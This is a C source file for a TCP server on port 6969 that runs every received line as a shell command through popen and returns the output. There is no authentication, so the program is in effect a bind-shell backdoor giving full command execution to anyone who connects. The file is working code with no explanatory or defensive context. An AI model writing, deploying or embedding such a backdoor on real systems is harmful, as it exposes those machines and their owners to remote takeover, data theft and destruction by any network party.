#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>

#define SERVER_PORT 6969
#define BUFFER_SIZE 1024

void handle_client(int client_sock) {
    char buffer[BUFFER_SIZE];
    int bytes_received;

    while((bytes_received = recv(client_sock, buffer, BUFFER_SIZE - 1, 0)) > 0) {
        buffer[bytes_received] = '\0';  // null termination
        printf("Received command: %s", buffer);

        FILE *fp = popen(buffer, "r");
        if (fp == NULL) {
            send(client_sock, "Failed to execute command\n", strlen("Failed to execute command\n"), 0);
            continue;
        }

        memset(buffer, 0, BUFFER_SIZE);
        size_t bytes_read;
        while ((bytes_read = fread(buffer, 1, BUFFER_SIZE - 1, fp)) > 0) {
            send(client_sock, buffer, bytes_read, 0);
            memset(buffer, 0, BUFFER_SIZE);
        }
        pclose(fp);
    }

    if (bytes_received == 0) {
        printf("Disconnected\n");
    } else if (bytes_received == -1) {
        perror("recv");
    }

    close(client_sock);

}

int main() {
    int server_sock, client_sock;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_addr_len = sizeof(client_addr);

    server_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (server_sock == -1) {
        perror("Socket creatuon failed!");
        return 1;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    server_addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(server_sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1) {
        perror("Bind fail");
        close(server_sock);
        return 1;
    }

    if (listen(server_sock, 5) == -1) {
        perror("Listen fail");
        close(server_sock);
        return 1;
    }

    printf("Server listening on port %d...\n", SERVER_PORT);

    while (1) {
        client_sock = accept(server_sock, (struct sockaddr *)&client_addr, &client_addr_len);
        if (client_sock == -1) {
            perror("Accept fail");
            continue;
        }

        printf("Client connected: %s:%d\n", inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));

        handle_client(client_sock);

    }

    close(server_sock);
    return 0;
}
